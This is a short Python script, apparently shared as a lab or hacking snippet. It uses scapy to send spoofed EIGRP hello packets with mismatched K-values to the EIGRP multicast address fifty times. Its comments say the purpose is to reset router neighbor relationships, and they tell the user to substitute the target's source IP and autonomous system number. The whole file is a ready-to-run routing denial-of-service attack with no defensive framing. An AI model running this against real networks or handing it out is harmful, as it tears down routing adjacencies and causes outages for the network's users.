#!/usr/bin/env python3
#Import time so we can set a sleep timer
import time
#Import scapy
from scapy.all import *
#Import EIGRP
load_contrib('eigrp')
#Create a loop
for i in range (0, 50):
    #Send EIGRP packet to reset neighbor relationships.
    #Change the source IP address (src) to the correct IP address
    #Change Autonomous System number (asn) to the correct number
    sendp(Ether()/IP(src="192.168.122.171",dst="224.0.0.10")/EIGRP(asn=100,
    tlvlist=[EIGRPParam(k1=255, k2=255, k3=255, k4=255, k5=255),EIGRPSwVer()]))
    #Add a one second delay
    time.sleep(1)
    
    
#Credits: 
#Warning: You visit any sites listed at your own risk.
#https://scapy.readthedocs.io/_/downloads/en/latest/pdf/
#https://scapy.ml.secdev.narkive.com/mKiGyM29/scapy-eigrp-layer-use-cases
